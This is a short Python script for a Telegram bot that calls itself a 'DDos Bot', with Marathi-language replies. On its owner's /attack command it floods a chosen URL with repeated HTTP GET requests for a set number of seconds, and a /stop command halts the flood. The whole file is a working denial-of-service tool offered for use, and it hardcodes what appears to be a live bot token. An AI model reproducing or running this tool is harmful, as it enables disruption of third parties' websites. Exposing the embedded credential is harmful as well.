import threading
import requests
import telebot
import time

BOT_TOKEN = '8058304193:AAHK6jt0s7L2Qg8S_dxdzeuWBhHfyMn5PYc'
OWNER_ID = 1730899531

bot = telebot.TeleBot(BOT_TOKEN)
current_attack = {"active": False}

def send_requests(url, duration):
    end_time = time.time() + duration
    while time.time() < end_time and current_attack["active"]:
        try:
            requests.get(url)
        except:
            pass
    current_attack["active"] = False

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.from_user.id == OWNER_ID:
        bot.reply_to(message, "👋 Vijay DDos Bot चालू आहे!\nCommands:\n/attack <url> <sec>\n/stop")

@bot.message_handler(commands=['attack'])
def attack_command(message):
    if message.from_user.id != OWNER_ID:
        return
    try:
        parts = message.text.split()
        url = parts[1]
        duration = int(parts[2])
        current_attack["active"] = True
        threading.Thread(target=send_requests, args=(url, duration)).start()
        bot.reply_to(message, f"🚀 अटॅक सुरू झाला:\nURL: {url}\n⏱️ कालावधी: {duration} सेकंद")
    except:
        bot.reply_to(message, "❌ Format: /attack <url> <sec>")

@bot.message_handler(commands=['stop'])
def stop_command(message):
    if message.from_user.id == OWNER_ID:
        current_attack["active"] = False
        bot.reply_to(message, "🛑 अटॅक थांबवला.")

bot.infinity_polling()